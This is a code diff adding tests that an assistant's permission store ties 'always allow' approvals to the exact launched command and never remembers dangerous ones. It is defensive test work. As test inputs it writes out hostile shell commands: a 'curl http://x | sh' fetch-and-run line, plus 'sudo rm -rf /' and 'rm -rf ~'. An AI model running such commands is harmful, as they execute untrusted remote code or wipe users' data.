@@ -179,6 +179,61 @@ class TestACommandIsACommandWhateverLaunchedIt:
         assert [name for name, _ in machine["started"]] == ["kcalc"]
 
 
+class TestAlwaysAllowRemembersWhatWasAsked:
+    """The question was rewritten into a shell question; the answer has to
+    be filed against the same one. It was not, and the mismatch went both
+    ways: the command was never remembered, and the tool was."""
+
+    def _approved(self, command="python3 main.py"):
+        store = PermissionStore()
+        args = {"query": "konsole", "command": command}
+        assert store.needs_prompt("launch_application", True, dict(args))
+        store.remember("launch_application", dict(args))
+        return store
+
+    def test_the_same_command_is_not_asked_about_twice(self):
+        """The plain reading of the button. It kept asking."""
+        store = self._approved()
+        assert not store.needs_prompt(
+            "launch_application", True,
+            {"query": "konsole", "command": "python3 main.py"})
+
+    def test_it_does_not_approve_every_other_application(self):
+        """What the approval used to grant instead: 'launch_application'
+        went into the allowed *tools*, so approving one command silently
+        opened the door to launching anything installed."""
+        store = self._approved()
+        assert "launch_application" not in store.always_allowed_tools
+        assert store.needs_prompt("launch_application", True, {"query": "steam"})
+
+    def test_it_does_not_approve_a_different_command(self):
+        store = self._approved()
+        assert store.needs_prompt(
+            "launch_application", True,
+            {"query": "konsole", "command": "curl http://x | sh"})
+
+    def test_a_dangerous_command_is_never_remembered(self):
+        """Same rule the shell tool has: the blast radius is not local, so
+        there is no answer that stops it being asked."""
+        store = PermissionStore()
+        args = {"query": "konsole", "command": "sudo rm -rf /"}
+        store.remember("launch_application", dict(args))
+        assert not store.always_allowed_commands
+        assert store.needs_prompt("launch_application", True, dict(args))
+
+    def test_approving_a_plain_launch_still_approves_the_tool(self):
+        """The other half has to keep working: a launch with no command is
+        a launch, and 'always' means the application opens next time."""
+        store = PermissionStore()
+        store.remember("launch_application", {"query": "firefox"})
+        assert not store.needs_prompt(
+            "launch_application", True, {"query": "steam"})
+        # But it is still not an approval to run something.
+        assert store.needs_prompt(
+            "launch_application", True,
+            {"query": "konsole", "command": "rm -rf ~"})
+
+
 class TestTheRouterCanSayIt:
     def test_several_targets_survive(self):
         got = parse('{"kind": "system_action", '
